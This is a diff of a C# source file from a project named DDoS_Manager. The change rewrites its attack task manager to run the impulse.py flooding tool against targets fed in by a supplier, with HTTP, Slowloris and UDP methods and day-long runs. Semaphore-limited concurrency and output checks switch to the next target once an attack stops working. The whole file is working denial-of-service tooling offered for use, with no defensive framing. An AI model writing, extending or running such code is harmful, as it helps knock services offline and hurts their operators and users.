@@ -1,77 +1,120 @@
 using System.Diagnostics;
+using ConcurrentCollections;
 
 namespace DDoS_Manager;
 
 public class AttackTaskManager
 {
-    private readonly int _maxTasksNumber;
-    private readonly Task[] _tasks;
+    private readonly int _semaphoreNumber;
+    private readonly List<Task> _tasks;
     private readonly TargetSupplier _targetSupplier;
-    private readonly HashSet<Process> _activeProcesses;
+    private readonly ConcurrentHashSet<Process> _activeProcesses;
     private readonly Mutex _mutex;
+    private readonly Semaphore _semaphore;
+    private const int MinutesUpperLimit = 30;
 
     public AttackTaskManager(int maxTasksNumber, TargetSupplier targetSupplier)
     {
-        _maxTasksNumber = maxTasksNumber;
-        _tasks = new Task[_maxTasksNumber];
+        _semaphoreNumber = maxTasksNumber;
+        _tasks = new List<Task>(_semaphoreNumber);
         _targetSupplier = targetSupplier;
-        _activeProcesses = new HashSet<Process>();
+        _activeProcesses = new ConcurrentHashSet<Process>();
         _mutex = new Mutex();
+        _semaphore = new Semaphore(maxTasksNumber, short.MaxValue);
     }
 
     public void InitializeAttack()
     {
-        for (var i = 0; i < _maxTasksNumber; i++)
+        var attackTasksManager = new Task(AttackTaskManageMethod);
+        attackTasksManager.Start();
+        attackTasksManager.Wait();
+    }
+
+    private void AttackTaskManageMethod()
+    {
+        // Create initial number of tasks
+        for (var i = 0; i < _semaphoreNumber; i++)
         {
-            _tasks[i] = new Task(AttackMethod);
+            _tasks.Add(new Task(AttackMethod));
             _tasks[i].Start();
         }
-        
-        for (var i = 0; i < _maxTasksNumber; i++)
+
+        foreach (var task in _tasks)
         {
-            _tasks[i].Wait();
+            task.Wait();
         }
     }
-    
+
     private void AttackMethod()
     {
+        var localSemaphore = new Semaphore(0, short.MaxValue);
+        string? data = null;
         while (true)
         {
+            _semaphore.WaitOne();
+            _mutex.WaitOne();
+            var (target, method) = _targetSupplier.GetNextTarget();
+            _mutex.ReleaseMutex();
+            
             var externalProcess = new Process();
             _activeProcesses.Add(externalProcess);
             externalProcess.StartInfo.FileName = "python3";
             externalProcess.StartInfo.WorkingDirectory = "resources";
             externalProcess.StartInfo.RedirectStandardOutput = true;
-            _mutex.WaitOne();
-            externalProcess.StartInfo.Arguments = "DRipper.py -s " + _targetSupplier.GetNextTarget();
-            _mutex.ReleaseMutex();
-            externalProcess.Start();
-
-            while (true)
+            externalProcess.StartInfo.UseShellExecute = false;
+            externalProcess.OutputDataReceived += (_, args) =>
             {
-                var line = externalProcess.StandardOutput.ReadLine();
-                if (line == null)
+                if (args.Data == null)
                 {
-                    Thread.Sleep(1000);
-                    continue;
+                    return;
                 }
+                data = args.Data;
+                localSemaphore.Release();
+            };
+            externalProcess.StartInfo.Arguments = 
+                "impulse.py --threads 1 --time 86400 --method " + method + " --target " + target;
+            externalProcess.Start();
+            var startUtcTime = DateTime.UtcNow;
+            
+            AttackLifecycle(localSemaphore, data, method, startUtcTime, externalProcess);
+        }
+    }
 
-                if (!line.Contains("rippering"))
-                {
-                    Console.WriteLine(line);
-                }
-                if (!line.Contains("check server ip and port") 
-                    && !line.Contains("no connection! web server maybe down!"))
-                {
-                    continue;
-                }
-                
-                Console.WriteLine("Changing targets...");
-                externalProcess.Kill();
-                _activeProcesses.Remove(externalProcess);
-                externalProcess.Close();
-                break;
+    private void AttackLifecycle(WaitHandle localSemaphore, string? data, string method, DateTime startUtcTime,
+        Process externalProcess)
+    {
+        while (true)
+        {
+            localSemaphore.WaitOne();
+            Debug.Assert(data != null);
+            Console.WriteLine(data);
+            if (!data.Contains("Timed out"))
+            {
+                continue;
             }
+
+            switch (method)
+            {
+                case "HTTP" when !data.Contains("Error"):
+                case "Slowloris" when !data.Contains("Failed"):
+                case "UDP" when (DateTime.UtcNow - startUtcTime).Minutes > MinutesUpperLimit:
+                    continue;
+            }
+
+            Console.WriteLine("Changing targets...");
+            externalProcess.Kill();
+            while (true) // Busy waiting removal
+            {
+                var isRemoved = _activeProcesses.TryRemove(externalProcess);
+                if (isRemoved)
+                {
+                    break;
+                }
+            }
+
+            externalProcess.Close();
+            _semaphore.Release();
+            break;
         }
     }
 
